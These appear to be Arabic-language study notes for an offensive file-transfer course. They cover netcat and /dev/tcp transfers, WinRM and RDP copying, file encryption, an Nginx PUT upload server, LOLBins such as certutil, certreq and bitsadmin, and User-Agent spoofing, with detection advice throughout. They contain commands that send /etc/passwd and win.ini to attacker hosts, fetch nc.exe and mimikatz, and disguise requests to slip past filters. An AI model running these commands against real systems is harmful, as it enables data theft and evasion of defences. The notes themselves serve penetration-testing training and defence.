python3 -c 'import requests; requests.post("http://<IP>:8000/upload", files={"files":open("/etc/passwd","rb")})'
```

---

## خلاصة سريعة

- لو في لينوكس: غالبًا **Python** و **PHP** هما الأسرع والأسهل.
    
- Ruby/Perl كويسين لو موجودين.
    
- على ويندوز استخدم `cscript` مع JS/VBS.
    
- دايمًا راجع الكود إللي هتنفذه قبل ما تعمل pipe لـ `bash` — ده أصلًا أهم حاجة من ناحية أمان.
    
- دفاعيًا: قفل الـ egress، راقب العمليات، وفعّل logging.
    

--------
# Layer 5

## مقدمة سريعة

القسم ده عن طرق نقل ملفات “مختلفة” مش اللي اتكلمنا عنها قبل كده — طرق زي **Netcat / Ncat**، استخدام `/dev/tcp` في bash، نقل عبر **PowerShell Remoting (WinRM)**، ونقل عبر **RDP** (نسخ/لصق أو مشاركات الدريف). كل طريقة ليها سيناريوهات مناسبة وموانع (firewall، صلاحيات، أدوات موجودة/مش موجودة).

---

## Netcat / Ncat — الأساس والفرق

- **Netcat (nc)**
أداة بسيطة بتقرأ وتكتب على sockets TCP/UDP، مفيدة جداً لنقل ملفات بسرعة.
    
- **Ncat** 
- هو إعادة كتابة أحدث من فريق Nmap، بيدعم SSL، IPv6، بروكسيات... وبيبقى اسمه أحياناً `ncat` أو `nc` حسب النظام.
    
- فكرة النقل بسيطة: جهاز واحد “يستمع” (listen) على بورت، والتاني “يتصل” ويرسل البيانات — أو العكس.
    

## مثال أساسي — الهدف (Victim) بيستمع، المهاجم يبعت

على الهدف (يكتب الملف اللي هيوصل له):

```bash
# netcat (قديم)
nc -l -p 8000 > SharpKatz.exe

# ncat (حديث) لازم --recv-only علشان يقفل لما يخلص
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

على المهاجم (بعت الملف):

```bash
# netcat (القادم يسلم الاتصال ويقف -q 0 يعني close بعد الانتهاء)
nc -q 0 192.168.49.128 8000 < SharpKatz.exe

# ncat (استخدم --send-only)
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

## مثال العكس — المهاجم بيستمع، الهدف يتصل وياخد الملف

على المهاجم (يستمع على بورت غالباً 443 لو فيه جدار ناري):

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# أو مع ncat
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

على الهدف:

```bash
nc 192.168.49.128 443 > SharpKatz.exe
# أو ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

### ملاحظات عملية:

- `-q 0` في netcat بيقفل بعد انتهاء الإرسال. بدونها أحيانًا الاتصال يفضل مفتوح.
    
- بعض توزيعات فيها `nc` نسخة قديمة أو مختلفة؛ لو فيه ncat استخدم الـ flags الخاصة بيه.
    
- لو بتحول ملفات ثنائية (exe)، تأكد تستخدم redirect binary (عادة ok على Linux).
    

---

## Netcat alternatives: /dev/tcp في Bash

لو مفيش `nc` أو `ncat`، ممكن تستخدم خاصية bash لفتح TCP socket عبر `/dev/tcp/host/port`.

**Receiver (target) باستخدام cat من /dev/tcp:**

```bash
# على الtarget لو مش عنده nc
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

**Sender (attack host) بيبعت الملف عبر nc أو بشيء يكتب على socket:**

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

أو ممكن تستخدم `exec 3<>/dev/tcp/...` و`>&3` لكن المثال بـ `cat` هو الأبسط.

### ملاحظات:

- `/dev/tcp` موجود بس لو bash compile بميزة net-redirections.
    
- عند القراءة عبر `cat < /dev/tcp/...` هيوصل لك كامل stream اللي السيرفر بيديه (headers لو HTTP). مفيد لو مفيش أدوات.
    

---

## متى تستخدم Netcat/Ncat؟

- لما السيرفر مش عنده أدوات أعلى مستوى (no wget/curl) لكن يقدر يعمل tcp connect.
    
- لما تحب نقل بدون برتوكول HTTP (أبسط).
    
- لما محتاج تعمل reverse transfer (target يتصل بالمهاجم) لأن الجدران النارية غالبًا تسمح باتصالات خارجية من الهدف.
    

---

## PowerShell Remoting (WinRM) — نقل ملفات في ويندوز الاحترافي

- WinRM يفتح listeners على **5985 (HTTP)** و **5986 (HTTPS)**. بيسمح بعمل جلسات PowerShell عن بعد (New-PSSession).
    
- لو عندك صلاحيات إدارية على الجهاز البعيد، تقدر `Copy-Item -ToSession` أو `-FromSession`.
    

## مثال عملي

1. افتح جلسة:
    

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

2. انسخ ملف من محلك لجهاز البعيد:
    

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

3. انسخ ملف من البعيد لمحلّك:
    

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

### ملاحظات:

- لازم تكون Administrative أو عندك صلاحيات مناسبة.
    
- مفيد في شبكات ويندوز corporate لأن WinRM مفعل أوقات كتير للإدارة.
    
- دفاعياً: راقب جلسات PSSession، قد تمنع WinRM لو مش محتاج، أو تقصره عبر GPO.
    

---

## RDP — نسخ ولصق وMounting drives

- لما تعمل Remote Desktop (RDP)، تقدر تنسخ/تلصق ملفات من والى الـ session (clipboard).
    
- بديل أقوى: أثناء تشغيل RDP client تقدر تعيّن “local drives” تبان في الجلسة كـ `\\tsclient\` — سهل تنقل ملفات.
    

## على لينكس (xfreerdp / rdesktop)

- مثال مع rdesktop:
    

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
# في الجلسة هتلاقي \\tsclient\linux
```

- مثال مع xfreerdp:
    

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

### ملاحظات:

- المجلد اللي عملته قابل للقراءة والكتابة من الجلسة وبترجع الملفات لجهازك.
    
- الدفاع: منع clipboard redirection أو منع مشاركة الأقراص للمستخدمين غير موثوقين. راقب جلسات RDP.
    

---

## سيناريوهات عملية وقرارات اختيار الطريقة

- لو الهدف ما يقدرش يستقبل incoming connections لكن يقدر يعمل outgoing HTTP -> استخدم `curl/wget` أو Python للـ pull.
    
- لو الهدف موجود خلف جدار وبتقدر تعمل reverse shell -> استخدم netcat عشان “الهدف يتصل بالمهاجم” وبعدين تبعت الملفات.
    
- في بيئات ويندوز enterprise مع صلاحيات إدارية -> PowerShell Remoting ممتاز وموثوق.
    
- لو بتتعامل مع Remote Desktop وعايز نقل ملفات بدون فتح بورتات جديدة -> استخدم drive redirection.
    

---

## أمثلة أوامر سريعة (Cheat-sheet)

```bash
# ==== Netcat basic (victim listens, attacker sends) ====
# victim:
nc -l -p 8000 > file.bin
# attacker:
nc -q 0 10.10.10.10 8000 < file.bin

# ==== Ncat (recv-only / send-only) ====
# victim (ncat):
ncat -l -p 8000 --recv-only > file.bin
# attacker (ncat):
ncat --send-only 10.10.10.10 8000 < file.bin

# ==== Reverse (attacker listens on 443, victim connects) ====
# attacker:
sudo nc -l -p 443 -q 0 < file.bin
# victim:
nc 10.10.10.10 443 > file.bin

# ==== /dev/tcp on victim (no nc) ====
# victim:
cat < /dev/tcp/10.10.10.10/443 > file.bin

# ==== PowerShell Remoting (on admin host) ====
# create session
$Session = New-PSSession -ComputerName TARGET
# copy to remote
Copy-Item -Path C:\local\file.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
# copy from remote
Copy-Item -Path C:\Users\Administrator\Desktop\target.txt -Destination C:\ -FromSession $Session

# ==== RDP mount with xfreerdp (Linux client) ====
xfreerdp /v:10.10.10.132 /u:administrator /p:'Password' /drive:linux,/home/user/rdp-share
# in Windows session, access \\tsclient\linux
```

---

## نصايح عملية (حاجات تعلمك “muscle memory”)

- جرب كل طريقة في lab محلي: لجهاز victim و attacker، شغّل nc/ncat وجرب forward/backwards.
    
- جرّب استخدام `/dev/tcp` لما مافيش أدوات — هتلاقيها مفيدة كتير في CTF.
    
- اتعلم تميّز transfer عبر HTTP vs raw TCP — HTTP بيضيف headers، raw TCP أنظف وأسرع.
    
- خد بالك من البايناري: لو بتنقل ملف ثنائي (exe) استخدم redirection binary، واتأكد permissions بعد النقل.
    

---
# Layer 6


الموضوع هنا عن **Protected File Transfers**  يعني إزاي كـ Penetration Tester تنقل ملفات حساسة (زي Credentials, NTDS.dit, أو Enumerations) من الجهاز الهدف للـ attacker machine **بأمان** من غير ما تتسرب أو تتشاف لو حد بيراقب الترافيك.

---

##  ليه لازم أحمي الملفات دي؟

- الملفات اللي بتسحبها في البنتست ممكن يكون فيها بيانات خطيرة جدًا (Passwords, PII, Financial Data).
    
- لو حد اعترضها وهي ماشية في الشبكة من غير تشفير → كارثة.
    
- عشان كده لازم دايمًا تستخدم تشفير أو بروتوكولات آمنة (SSH, SFTP, HTTPS).
    
- ولو مش متاح → لازم تعمل **تشفير للملف نفسه** قبل ما تنقله.
    

---

## File Encryption على **Windows**

HTB مديالك سكريبت PowerShell اسمه: **Invoke-AESEncryption.ps1**  
ده سكريبت بسيط بيشفر Strings أو Files باستخدام AES.

### طريقة الاستخدام:

1. تنقل السكريبت على الجهاز الهدف.
    
2. تعمل Import للسكريبت:
    
    ```powershell
    Import-Module .\Invoke-AESEncryption.ps1
    ```
    
3. بعد كده عندك أوامر:
    

- **Encrypt نص**:
    
    ```powershell
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text"
    ```
    
    → هيرجعلك Base64 ciphertext.
    
- **Decrypt النص**:
    
    ```powershell
    Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "<ciphertext>"
    ```
    
- **Encrypt ملف**:
    
    ```powershell
    Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path .\scan-results.txt
    ```
    
    → هيتعمل ملف جديد `scan-results.txt.aes`
    
- **Decrypt ملف**:
    
    ```powershell
    Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path .\scan-results.txt.aes
    ```
    
    → يرجع الملف الأصلي.
    

> ⚠️ لازم تستخدم Password قوية ومختلفة لكل عميل (عشان لو Password اتسربت ما تنفكش باقي الملفات).

---

##  File Encryption على **Linux**

هنا بنستخدم **OpenSSL** (موجود افتراضيًا في معظم توزيعات لينكس).

### Encrypt ملف:

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
```

- `-aes256`: التشفير AES-256
    
- `-iter 100000`: يزود صعوبة الـ brute-force
    
- `-pbkdf2`: استخدام خوارزمية قوية لاشتقاق الـ Key من الـ Password
    

### Decrypt الملف:

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

---

##  الخلاصة

- الفكرة إنك **بتأمن الملف نفسه** قبل ما تنقله بأي بروتوكول (حتى لو HTTP عادي).
    
- على **Windows**: استخدم سكريبت `Invoke-AESEncryption.ps1`.
    
- على **Linux**: استخدم `openssl enc`.
    
- بعد التشفير تقدر تنقل الملف بأي وسيلة (wget, SMB, HTTP, RDP share…) وانت مطمن.
    

---

# Layer 7
إزاي تجهّز **web server آمن** علشان الناس ترفعلك ملفات (PUT/UPLOAD) عبر HTTP/S، وليه نستخدم Nginx بدل Apache هنا، وإزاي تختبر وتمنع الثغرات، وكمان حلول بديلة وخطوات دفاعية.

هقسم الكلام علشان تقدر تمشي عليه عمليًا.

---

## الفكرة العامة

- HTTP/HTTPS هما أكتر البروتوكولات اللي بيعدّوا من الفايروولز، فلو عايز تستقبل ملفات من هدف أو تجمع ملفات، HTTP(S) عملي جداً.
    
- لو استخدمت HTTP عادي والملف فيه حسّاس، حد يقدر يعترضه — عشان كده استخدم HTTPS أو **شفّر الملف قبل النقل**.
    
- مهمة جدًا: لو بتسمح للناس يرفعوا، متخليش السيرفر ينفّذ الملفات دي (ممنوع تسيب upload directory يقدر يختبئ فيه web shell).
    

---

## ليه Nginx هنا؟

- Nginx
- أبسط في التعامل مع config وبيجي بحد أدنى من الوظائف، فبيقلل خطر إنك بالغلط تفعّل شيء خطير (زي تنفيذ PHP على فولدر رفع).
    
- Apache مع mod_php ممكن يخلي أي `.php` اترفع واتنفّذ لو مش مضبوط، وده خطر كبير.
    

---

## خطوات عملية: تفعيل PUT upload في Nginx 

1. **انشئ فولدر للرفع** (مثال):
    

`sudo mkdir -p /var/www/uploads/SecretUploadDirectory`

2. **غيّر الملكية لِـ www-data** (يعني الوب سيرفر يقدر يكتب هناك):
    

`sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory`

3. **اعمل config لـ Nginx** — فايل جديد `/etc/nginx/sites-available/upload.conf` بمحتوى بسيط:
    

`server {     listen 9001;      location /SecretUploadDirectory/ {         root    /var/www/uploads;         dav_methods PUT;     } }`

![[Pasted image 20250924175113.png]]

- `listen 9001` هنا بنختار بورت غير 80 علشان نتجنب تعارض بورت لو في حاجة تانية شغالة.
    
- `root /var/www/uploads;` مع `location /SecretUploadDirectory/` يعني إن المسار الكامل حيكون `/var/www/uploads/SecretUploadDirectory/...`
    
- `dav_methods PUT;` بيفعّل دعم HTTP PUT (Nginx من نفسه ما بيسمحش بالـ PUT إلا بتفعيل WebDAV method أو config زي ده).
    

4. **فعّل الموقع** (symlink إلى sites-enabled):
    

`sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/`

5. **إعادة تشغيل Nginx**:
    

`sudo systemctl restart nginx.service`

لو في error اتشيك على:

`sudo tail -n 50 /var/log/nginx/error.log`

---

## مشكلة شائعة: Port 80 مستخدم بالفعل

- لو شغلت Nginx وحصل `bind() to 0.0.0.0:80 failed (98: Address already in use)` يبقى في خدمة تانية ماسكة 80 (مثال في Pwnbox: python websockify أو python -m http.server).
    
- تحلها إما بتغيير البورت (زي المثال استخدمنا 9001) أو توقف الخدمة اللي ماسكة 80 أو تشيل default site:
    

`sudo rm /etc/nginx/sites-enabled/default sudo systemctl restart nginx`

- أو تشوف مين شغال على 80:
    

`ss -lnpt | grep :80 ps -ef | grep <pid>`

---

## اختبار الرفع باستخدام curl

لو كل حاجة تمام:

- ارفع `/etc/passwd` كـ `users.txt` على السيرفر:
    

`curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt`

- تأكد إن الملف وصل:
    

`sudo tail -n 1 /var/www/uploads/SecretUploadDirectory/users.txt`

---

## لازم تخلي بالك — الأمان والاحتياطات المهمة

1. **ممنوع تسمح بتنفيذ ملفات في فولدر الرفع**
    
    - لا تخلّي فولدر الرفع داخل webroot تاني فيه إعدادات تنفيذ سكربتات.
        
    - أفضل تخزّن الملفات في مكان خارج الويب كـ `/var/uploads_incoming` وتحمّلها لمعالجة بعد كده.
        
2. **لا تتيح Directory Listing**
    
    - لازم تتأكد إن لما الواحد يدخل `http://server/SecretUploadDirectory/` مش يشوف لستة الملفات تلقائيًا. Nginx ما بيفعلش ده افتراضي، لكن اتأكد بوجود `autoindex off;`.
        
3. **حط Authentication**
    
    - لو دا سيرفر رفع خاص بالباوند، فعّل Basic Auth أو أفضل: TLS client certs أو HTTP auth مع username/password. مثال بسيط مع basic auth (htpasswd):
        

`sudo apt-get install apache2-utils sudo htpasswd -c /etc/nginx/.htpasswd uploader # بعدها في config location تضيف: auth_basic "Upload"; auth_basic_user_file /etc/nginx/.htpasswd;`

4. **استعمل HTTPS**
    
    - استخدم شهادة صالحة (Let’s Encrypt أو self-signed لو داخلي) علشان الترافيك يتشفّر. ده يمنع اعتراض الملفات في الطريق.
        
5. **قيد نوع وحجم الملف**
    
    - حط limits للـ MIME types المقبولة وحجم الأبلود (`client_max_body_size`) لتقلل الهجمات وملفات ضخمة تستهلك الموارد:
        

`location /SecretUploadDirectory/ {     ...     client_max_body_size 10M; }`

6. **سكان على الملفات المرفوعة**
    
    - شغّل antivirus / YARA / ClamAV على الفايلات فور وصولها، منع رفع webshell أو exe.
        
    - ارجع امنع رفع امتدادات معينة (.php, .pl, .asp, .aspx, .exe, .sh) لو مش محتاجهم.
        
7. **رفع في ديركتوري غير قابل للتنفيذ**
    
    - `chmod` للملفات والديركتوري بخامات تمنع التنفيذ:
        

`sudo chmod 750 /var/www/uploads/SecretUploadDirectory sudo chmod -R 640 /var/www/uploads/SecretUploadDirectory/*`

8. **سجل كل عمليات الرفع**
    
    - فعّل access log خاص بالـ location ده عشان تبقى قادر تراجع مين رفع ومتى.
        
9. **افصل الخدمة**
    
    - استخدم dedicated account وخدمات منفصلة للتخزين، مش تدي صلاحيات root للسيرفر اللي يستقبل الملفات.
        

---

## بدائل سريعة لو مش عايز Nginx

- **uploadserver (python)** — simple, supports HTTPS if تعمل cert، سريع للتجارب:
    

`python3 -m pip install --user uploadserver python3 -m uploadserver 443 --server-certificate ~/server.pem`

- **Apache** — ممكن تعمل PUT لكن لازم تضبط modules وpermissions كويس (خطر لو فعلت PHP على نفس المسار).
    
- **SCP/SFTP** أو **S3 (secure cloud)** — لو عايز تشيل التعقيد من السيرفر، افتح SFTP أو ارفع لـ bucket مؤمّن.
    

---
# Layer 8
إيه معنى _Living off the Land_, إزاي تستخدم مواقع LOLBAS وGTFOBins، أمثلة عملية (certreq, openssl, bitsadmin, certutil)، ونصايح دفاعية وإرشادات عملية تخلي الموضوع مفيد للـ HTB والـ pentest الشرعي. جاهز؟ يلا.

---

## أولاً — يعني إيه “Living off the Land” (LOL / LOLBins)؟

الـ **LOLBins** أو “Living off the Land binaries” هما برامج أصلية موجودة في النظام (Windows أو Linux) واللي طُوِّرت علشان تعمل مهام نظامية، لكن المهاجم يقدر يستغلها عشان ينفّذ مهام خبيثة: تنزيل/رفع ملفات، تنفيذ أوامر، قراءة/كتابة ملفات، إلخ. الميزة للمهاجم: مفيش أدوات غريبة تتنزل على النظام فتقلل فرص كشف الـAV/EDR.

فيه موقعين مهمين:

- **LOLBAS** — لمصادر Windows (قائمة Windows binaries اللي ممكن تُستخدم).
    
- **GTFOBins** — لمصادر Linux.
    

---

## استخدام الـLOLBAS وGTFOBins

- افتح الموقع وبحث بكلمة مفتاحية زي `download` أو `upload` أو اسم البيناري (مثلاً `certreq`, `bitsadmin`, `openssl`) وهتلاقي أمثلة أوامر جاهزة.
    

دول مصادر ممتازة عشان تِتعلم طرق بديلة لما `wget/curl` مش موجودين أو لما الـ outbound مقيد.

---

## أمثلة عملية من النص — Windows: `certreq.exe`

**فكرة**: `certreq.exe` عادة تستخدم لطلبات شهادات، لكن على بعض النسخ فيها خيار `-Post` اللي ممكن يرفع ملف عبر HTTP POST.

**سير العمل**:

1. على الـ attacker (Pwnbox) شغّل listener:
    

`sudo nc -lvnp 8000`

2. على الـ Windows target شغّل:
    

`certreq.exe -Post -config http://<ATTACKER_IP>:8000/ C:\Windows\win.ini`

- الـ certreq هيرسل محتوى الـ `win.ini` كـ POST request على المهاجم.
    
- على الـ netcat هتشوف الـ HTTP POST وbody بتاع الملف — تقدر تنسخ المحتوى.
    

**ملاحظات**:

- مش كل نسخة من `certreq.exe` فيها `-Post`. لو مش موجود، هيرجع error.
    
- لما تلاقيها شغالة مفيدة في سيناريوهات عندك قيود على الأدوات العادية.
    

---

## أمثلة عملية — Linux: `openssl s_server` و `s_client` (استغلال openssl كـ netcat)

`openssl`
موجود على أكتر الـ _nix_، وممكن تستخدمه كـ TCP server أو client مش بس لتشفير.

**على Pwnbox (يستقبل الملف ويعرضه كـ TLS server)**:

`# اصنع شهادة+مفتاح openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out certificate.pem  # سكّر سيرفر يستمع ويطلع محتوى الملف اللي محطوط في stdin openssl s_server -quiet -accept 80 -cert certificate.pem -key key.pem < /tmp/LinEnum.sh`

هنا بنخلي محتوى `/tmp/LinEnum.sh` يتبعت للكل اللي يتصل.

**على الtarget (يحفظ الناتج في ملف)**:

`openssl s_client -connect <PWNBOX_IP>:80 -quiet > LinEnum.sh`

- الـ s_client هيتصل ويستلم الـ stream ويحفظه في `LinEnum.sh`.
    

**ملاحظات**:

- ممكن تشتغل على بورتات مختلفة.
    
- مفيد لو `nc` مش موجود لكن openssl موجود.
    

---

## Bitsadmin / BITS (Windows)

BITS هو Background Intelligent Transfer Service — خدمة ويندوز لتنزيل/رفع ملفات بكفاءة. ممكن يستخدمها المهاجم لتنزيل ملفات من HTTP أو SMB.

**مثال**:

`# bitsadmin (قديمة لكن موجودة) bitsadmin /transfer wcb /priority foreground http://10.10.15.66:8000/nc.exe C:\Users\htb-student\Desktop\nc.exe  # أو PowerShell module Import-Module bitstransfer Start-BitsTransfer -Source "http://10.10.10.32:8000/nc.exe" -Destination "C:\Windows\Temp\nc.exe"`

**مميزات**:

- شغّالة على أغلب الأنظمة، بتشتغل في الخلفية، أحيانًا أقل كشفًا.  
    **عيوب**:
    
- بعض EDRs تراقب BITS jobs وتكتشف الاستخدام المشبوه.
    

---

## Certutil (Windows)

`certutil` أداة موجودة في كل نسخ ويندوز لإدارة الشهادات — لكن ناس استغلوها لتنزيل ملفات (عملت شهرة كـ “wget on Windows”).

**مثال تنزيل** (في النص استخدم flags مختلفة لكن الفكرة واحدة):

`certutil.exe -urlcache -split -f http://10.10.10.32:8000/nc.exe nc.exe`

- هيعمل download ويكتب `nc.exe`.  
    **ملاحظات أمان**:
    
- AMSI / EDR الحديثة تلتقط نمط استخدام certutil لتنزيل ملفات مش متوقعة.
    
- دايمةً يتم اكتشافها في أنشطة خبيثة.
    

---

## نصايح عملية للتجربة (Lab)

- جرب كل طريقة في مختبرك (HTB Pwnbox + VM هدف).
    
- لو `nc` مش موجود، شوف هل openssl/openssl s_client شغال.
    
- اتعلم تحوّل العملية: reverse vs bind (يعني مين اللي يستمع ومين اللي يتصل) علشان تتعامل مع firewalls.
    

---

## كشف (Detection) وطرق الدفاع — مهم جداً

لو انت مهتم بالـ blue team أو بتحب تبقى محترف دفاعي، دول شوية حاجات تراقبها:

### على مستوى الـ Host

- **Process monitoring**: راقب عمليات `certreq.exe`, `certutil.exe`, `bitsadmin`, `powershell` مع أوامر غريبة، `openssl` اللي بتبعث/تستقبل بيانات على net.
    
- **Command-line logging**: فعّل logging للأوامر (Windows: Sysmon — CommandLine logging; Linux: auditd / process accounting).
    
- **AppLocker / WDAC**: اقصر استخدام برامج النظام اللي مش لازمة أو قيّد استخدامهم لحالات محددة.
    
- **EDR**: قواعد تكشف usage patterns زي `certutil -urlcache` أو `bitsadmin /transfer` أو `openssl s_client` usage.
    

### على مستوى الشبكة

- **Egress filtering**: اقصر الاتصالات الخارجة لبروتوكولات وبورتات لازمة بس.
    
- **IDS/Proxy logs**: راقب POSTs أو unusual HTTP methods ورفع ملفات عبر HTTP.
    
- **Monitor BITS jobs**: BITS job scheduling ممكن يكون مؤشر.
    

### سياسات وإجراءات

- منع استخدام أدوات إدارية من accounts عادية.
    
- افصل الشبكات الحساسة وحدد قواعد NAT/eProxy.
    
- سجّل كل الاتصالات الخارجية وسجل الـ DNS requests.
    

---

## أخلاقيات + تحذير قانوني

- استخدم الأساليب دي بس في بيئة **مصرح بها** (lab، pentest contract، HTB).
    
- ماتنقلش بيانات حقيقية من أنظمة زبائن من غير اتفاق صريح — استخدم dummy data لو بتختبر DLP.
    

---

## خلاصة قصيرة

- **LOLBAS / GTFOBins** مصادر ذهبية لطرق بديلة.
    
- أدوات زي `certreq`, `openssl`, `bitsadmin`, `certutil` بتسمح تنزيل/رفع بدون تثبيت أدوات إضافية.
    
- دايمًا اختبر في lab، وشغّل تشفير لو بتنقل بيانات حسّاسة.
    
- لو دورك دفاعي: راقب الأنماط دي، فعّل logging وقيّد الاستخدام.

--------
# Layer 9
النقطة هنا إنهم بيورّوك إزاي أدوات زي:

- **Invoke-WebRequest / Invoke-RestMethod**
    
- **WinHttpRequest**
    
- **Msxml2.XMLHTTP**
    
- **certutil**
    
- **BITS (Background Intelligent Transfer Service)**
    

بيبانوا في **Server Logs** من خلال الـ **User-Agent Strings**.

فـ الحل أو الفكرة:

- كل واحدة من دول بتسيب **Fingerprint** مميز في الـ **HTTP Request**.
    
- مثلاً:
    
    - PowerShell → `WindowsPowerShell/5.1.14393.0`
        
    - WinHttpRequest → `WinHttp.WinHttpRequest.5`
        
    - Msxml2 → شبه Internet Explorer UA
        
    - Certutil → `Microsoft-CryptoAPI/10.0`
        
    - BITS → `Microsoft BITS/7.8`
        

بالتالي الـ SIEM / الـ Blue Team يقدروا يعملوا Detection أو Filtering على الـ **User-Agent**.

يعني باختصار:

- **الميثود** → إنك تكشف نقل الملفات الخبيث عن طريق الـ **User-Agent Strings**.
    
- وأي Traffic مش من Browser عادي (Chrome, Firefox...) أو Service Legitimate بيتعمله Flag كـ Suspicious.
    

---
# Layer 10
## فكرة سريعة — ليه الـ User-Agent مهمّة؟

كل ما يتصل عميل HTTP بسيرفر، بيبعت Header اسمه `User-Agent` بيقول السيرفر هو المتصفح/البرنامج إيه. مدراء الشبكات ممكن يعملوا قواعد على الـ User-Agent عشان يفلتروا أدوات مش مرغوب فيها (مثلاً PowerShell, certutil, BITS).  
المشكلة: المستخدم الشرير يقدر **يغيّر الـ User-Agent** علشان الطلب يظهر كأنه جاي من Chrome/Firefox ويمرّ من الفلاتر.

---

## إزاي تغيّر الـ User-Agent في PowerShell

PowerShell عنده قيمة جاهزة (PSUserAgent) تقدر تستخدمها بسهولة:

### تشوف القيم الجاهزة:

`[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() |   Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl`

![[Pasted image 20250924180856.png]]


ده هيطلع لك أمثلة: InternetExplorer, FireFox, Chrome, Opera, Safari.

### مثال: استخدم Chrome User-Agent مع `Invoke-WebRequest`

`$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"`

الـ HTTP request اللي على السيرفر هيبقى شكله زي طلب من Chrome — وده يخدع قواعد بسيطة مبنية على الـ UA.

---

## ملاحظات الهروب (Evading detection)

- تغيير الـ UA بسيط وسريع، وبيخلي قواعد blacklist على سلاسل UA فقط **غير فعّالة**.
    
- عشان كده الـ defenders لازم مايعتمدوش على UA لوحده؛ لازم يشوفوا سلوك الاتصالات (منين بتتصل، تكرار، نمط الطلبات، حجم البيانات، إلخ).
    
- كمان المهاجم ممكن يغيّر الحقول التانية في الheaders (Accept, Accept-Encoding, Cookies) علشان يطابق متصفح حقيقي.
    

---

## LOLBINS — لما الـ system tools بتشتغل لصالح المهاجم

لو فيه Application Whitelisting (AppLocker/WDAC) منع PowerShell أو nc، المهاجم يدوّر على **LOLBIN** — برنامج مُثبّت أصلاً ومسموح ينفّذ، وبيعمل وظيفة تحميل/تحديث. مثال من النص:

### مثال: `GfxDownloadWrapper.exe`

`GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"`

لو الـ GfxDownloadWrapper مسموح، المهاجم هيستعمله لتنزيل ملف بدون رفع كشف AppLocker لأن الـ binary نفسه مسموح.

> دورك كمهاجم: تفحص LOLBAS (Windows) وGTFOBins (Linux) تدور على binary يناسبك.  
> دورك كمدافع: راقب استخدامات غير متوقعة للـ binaries المسموح بيها.

---

## Detect & Defend — إزاي تكشف المحاولات دي بذكاء

### 1. ما تعتمدش على blacklists للـ command lines أو UA لوحدهم

- blacklist سهل يتعدّى (case obfuscation، تغيير UA).
    
- الأفضل: **whitelisting** للأوامر/command lines المقبولة — صعب بداية، لكن قوي بعد كده.
    

### 2. راقب الـ User-Agent لكن بطريقة ذكية

- أنشئ قائمة بالـ UA الشرعية في شبكتك (browsers, update services).
    
- أي UA غريب أو UA مش متوافق مع مصدر الاتصال (مثلاً: Windows update UA من جهاز مستخدم عادي في فرع غير متوقع) اعمل alert.
    

### 3. فحص سلوك الطلب

- حجم التحميل/نوع المحتوى/time-of-day/unusual endpoints — كلهم دلائل مهمة.
    
- مثلا: عملية `Invoke-WebRequest` متكررة من نفس الجهاز لملفات exe → مش طبيعي.
    

### 4. احترس من LOLBINS

- راقب الـ process lineage (مين فتح مين). لو `explorer.exe` فجأة شغّل `certreq.exe` لتحميل ملف، ده مؤشر.
    
- ضع قيود AppLocker على نسخه المشبوهة أو قصر صلاحياتها.
    

### 5. مسؤليات الشبكة

- استخدام proxy مركزي يحلل الـ headers ويفرض سياسات (تمنع UA spoofing لبعض الأنواع، ولازم توثيق).
    
- Egress filtering: اقصر الاتصالات الخارجة لبروتوكولات/destinations المسموح بها.
    

### 6. قارن header fingerprints

- متصفحات حقيقية ليها أنماط headers معروفة (Accept, Accept-Encoding, Order of headers). لو UA يقول Chrome لكن الheaders ناقصة أو مش متوافقة — علامة شك.
    

### 7. TLS / JA3 Fingerprinting

- لو TLS مستخدم، تحليل fingerprint للشبكة ممكن يكشف clients غير متصفحية لأن المكتبات تولّد JA3 مختلفة عن Chrome/Firefox.
    

### 8. Logging & Hunting

- سجّل كامل command lines في Sysmon (Windows) وauditd (Linux).
    
- صمم queries في SIEM تبحث عن: certutil download, BITS jobs, PowerShell network activity with nonstandard UAs.
    

---

## أمثلة سريعة للكشف (cheat)

- Detect PowerShell web downloads:
    
    - Sysmon query: `Image: powershell.exe AND CommandLine contains Invoke-WebRequest`
        
- Detect certutil downloads:
    
    - Web server logs: `User-Agent: Microsoft-CryptoAPI` → alert
        
- Detect UA spoof mismatch:
    
    - IP from internal update server but UA is Chrome → suspicious.
        

---

## خلاصة سريعة

- تغيير الـ User-Agent سهل ومش كفاية لوحده للهروب.
    
- الدفاع الفعّال يحتاج: whitelisting، مراقبة سلوكيّة، logging متين، ومحاذير ضد LOLBINS.
    
- المهاجم هيدوّر على أي binary مسموح (LOLBAS/GTFOBins) عشان يتجاوز القيود — فابحث عنهم واحسب لهم بال.
